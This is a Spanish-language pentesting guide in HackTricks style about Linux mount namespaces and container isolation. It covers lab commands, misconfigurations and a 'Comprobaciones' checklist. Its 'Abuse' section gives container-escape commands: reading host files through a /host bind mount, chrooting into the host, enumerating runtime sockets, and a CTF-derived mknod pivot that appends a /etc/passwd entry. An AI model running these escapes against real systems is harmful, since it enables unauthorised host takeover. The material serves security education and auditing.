# Espacio de nombres de montaje

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres de montaje controla la **tabla de montajes** que ve un proceso. Esta es una de las características de aislamiento de contenedores más importantes porque el sistema de archivos raíz, bind mounts, montajes tmpfs, la vista de procfs, la exposición de sysfs y muchos montajes auxiliares específicos del runtime se expresan a través de esa tabla de montajes. Dos procesos pueden acceder ambos a `/`, `/proc`, `/sys` o `/tmp`, pero a qué se resuelven esas rutas depende del espacio de nombres de montaje en el que estén.

Desde la perspectiva de seguridad de contenedores, el espacio de nombres de montaje suele ser la diferencia entre "este es un sistema de archivos de aplicación cuidadosamente preparado" y "este proceso puede ver o influir directamente en el sistema de archivos del host". Por eso los bind mounts, los volúmenes `hostPath`, las operaciones de montaje privilegiadas y las exposiciones escribibles de `/proc` o `/sys` giran en torno a este espacio de nombres.

## Funcionamiento

Cuando un runtime lanza un contenedor, normalmente crea un nuevo espacio de nombres de montaje, prepara un sistema de archivos raíz para el contenedor, monta procfs y otros sistemas de archivos auxiliares según sea necesario, y luego opcionalmente añade bind mounts, montajes tmpfs, secrets, config maps o host paths. Una vez que ese proceso está ejecutándose dentro del namespace, el conjunto de montajes que ve queda en gran medida desacoplado de la vista por defecto del host. El host puede seguir viendo el sistema de archivos subyacente real, pero el contenedor ve la versión ensamblada para él por el runtime.

Esto es poderoso porque permite que el contenedor crea que tiene su propio sistema de archivos raíz aun cuando el host sigue gestionando todo. También es peligroso porque si el runtime expone el montaje equivocado, el proceso de repente obtiene visibilidad de recursos del host que el resto del modelo de seguridad puede no haber sido diseñado para proteger.

## Laboratorio

Puedes crear un espacio de nombres de montaje privado con:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Si abres otra shell fuera de ese mount namespace e inspeccionas la tabla de montajes, verás que el montaje tmpfs existe solo dentro del mount namespace aislado. Esto es un ejercicio útil porque muestra que el aislamiento de montajes no es teoría abstracta; el kernel está literalmente presentando una tabla de montajes diferente al proceso.
Si abres otra shell fuera de ese mount namespace e inspeccionas la tabla de montajes, el montaje tmpfs existirá solo dentro del mount namespace aislado.

Dentro de los contenedores, una comparación rápida es:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
El segundo ejemplo demuestra lo fácil que es que una configuración en tiempo de ejecución abra un enorme agujero en la frontera del sistema de archivos.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O all rely on a private espacio de nombres de montaje para contenedores normales. Kubernetes builds on top of the same mechanism for volumes, projected secrets, config maps, and `hostPath` mounts. Incus/LXC environments also rely heavily on espacios de nombres de montaje, especialmente porque los contenedores del sistema suelen exponer sistemas de archivos más ricos y más parecidos a los de una máquina que los contenedores de aplicaciones.

Esto significa que cuando revisas un problema del sistema de archivos de un contenedor, normalmente no estás viendo una rareza aislada de Docker. Estás viendo un problema del espacio de nombres de montaje y de la configuración del runtime expresado a través de la plataforma que lanzó la carga de trabajo.

## Misconfigurations

El error más obvio y peligroso es exponer el root filesystem del host u otra ruta sensible del host mediante un bind mount, por ejemplo `-v /:/host` o un `hostPath` escribible en Kubernetes. En ese punto, la cuestión deja de ser "¿puede el contenedor escaparse de alguna manera?" y pasa a ser "¿cuánto contenido útil del host ya es directamente visible y escribible?" Un bind mount del host con permisos de escritura a menudo convierte el resto del exploit en una simple cuestión de colocación de archivos, chrooting, modificación de la configuración o descubrimiento de sockets en tiempo de ejecución.

Otro problema común es exponer `/proc` o `/sys` del host de formas que eviten la vista más segura del contenedor. Estos sistemas de archivos no son montajes de datos ordinarios; son interfaces hacia el estado del kernel y de los procesos. Si la carga de trabajo accede directamente a las versiones del host, muchas de las suposiciones detrás del endurecimiento de contenedores dejan de aplicarse con claridad.

Las protecciones de solo lectura también importan. Un root filesystem de solo lectura no asegura mágicamente un contenedor, pero elimina una gran cantidad de espacio de preparación para el atacante y dificulta la persistencia, la colocación de binarios auxiliares y la manipulación de la configuración. Por el contrario, un root escribible o un bind mount del host escribible le dan al atacante espacio para preparar el siguiente paso.

## Abuse

Cuando se abusa del espacio de nombres de montaje, los atacantes suelen hacer una de cuatro cosas. Ellos **leen datos del host** que deberían haber permanecido fuera del contenedor. Ellos **modifican la configuración del host** a través de bind mounts escribibles. Ellos **montan o remontan recursos adicionales** si las capabilities y seccomp lo permiten. O ellos **alcanzan sockets poderosos y directorios de estado en tiempo de ejecución** que les permiten pedirle a la plataforma de contenedores más acceso.

Si el contenedor ya puede ver el sistema de archivos del host, el resto del modelo de seguridad cambia inmediatamente.

Cuando sospeches de un host bind mount, primero confirma qué está disponible y si es escribible:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Si el sistema de archivos raíz del host está montado en modo lectura-escritura, el acceso directo al host suele ser tan simple como:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Si el objetivo es obtener acceso privilegiado en tiempo de ejecución en lugar de chrooting directo, enumera sockets y el estado en tiempo de ejecución:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Si `CAP_SYS_ADMIN` está presente, también prueba si se pueden crear nuevos mounts desde dentro del contenedor:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Ejemplo completo: Two-Shell `mknod` Pivot

Surge una vía de abuso más especializada cuando el usuario root del contenedor puede crear dispositivos de bloque, el host y el contenedor comparten una identidad de usuario de forma útil, y el atacante ya tiene un punto de apoyo de bajos privilegios en el host. En esa situación, el contenedor puede crear un nodo de dispositivo como `/dev/sda`, y el usuario del host con bajos privilegios puede luego leerlo a través de `/proc/<pid>/root/` para el proceso del contenedor correspondiente.

Dentro del contenedor:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Desde el host, como el usuario de bajo privilegio correspondiente tras localizar el PID del shell del container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La lección importante no es la búsqueda exacta de cadenas del CTF. Es que la exposición de mount-namespace a través de `/proc/<pid>/root/` puede permitir que un usuario del host reutilice nodos de dispositivo creados por el contenedor incluso cuando la política de dispositivos de cgroup impedía su uso directo dentro del propio contenedor.

## Comprobaciones

Estos comandos sirven para mostrarte la vista del sistema de archivos en la que el proceso actual realmente está viviendo. El objetivo es detectar montajes provenientes del host, rutas sensibles con permisos de escritura y cualquier cosa que parezca más amplia que el sistema de archivos raíz típico de un contenedor de aplicación.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Lo interesante aquí:

- Los bind mounts desde el host, especialmente `/`, `/proc`, `/sys`, directorios de estado en tiempo de ejecución o ubicaciones de sockets, deberían destacar de inmediato.
- Los montajes inesperados de lectura-escritura suelen ser más importantes que un gran número de montajes auxiliares de solo lectura.
- `mountinfo` es a menudo el mejor lugar para ver si una ruta es realmente derivada del host o respaldada por un overlay.

Estas comprobaciones establecen **qué recursos son visibles en este namespace**, **cuáles derivan del host**, y **cuáles de ellos son escribibles o sensibles para la seguridad**.
